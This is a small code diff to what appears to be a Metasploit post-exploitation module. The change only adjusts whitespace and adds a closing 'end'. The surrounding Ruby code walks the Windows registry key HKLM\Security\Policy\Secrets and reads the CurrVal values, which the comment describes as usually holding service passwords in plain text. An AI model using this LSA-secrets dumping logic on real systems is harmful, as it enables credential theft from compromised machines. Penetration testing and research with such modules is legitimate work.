@@ -190,11 +190,11 @@ class Metasploit3 < Msf::Post
     root_key = "HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\"
 
     key_arr = meterpreter_registry_enumkeys(root_key)
+
     key_arr.each do |keys|
       mid_key = root_key + "\\" +  keys
       sk_arr = meterpreter_registry_enumkeys(mid_key)
       sk_arr.each do |mkeys|
-
         #CurrVal stores the currently set value of the key, in the case of
         #services it usually come out as plan text
         if(mkeys == "CurrVal")
@@ -232,6 +232,7 @@ class Metasploit3 < Msf::Post
           end
         end
       end
+    end
     return sec_str
   end
 
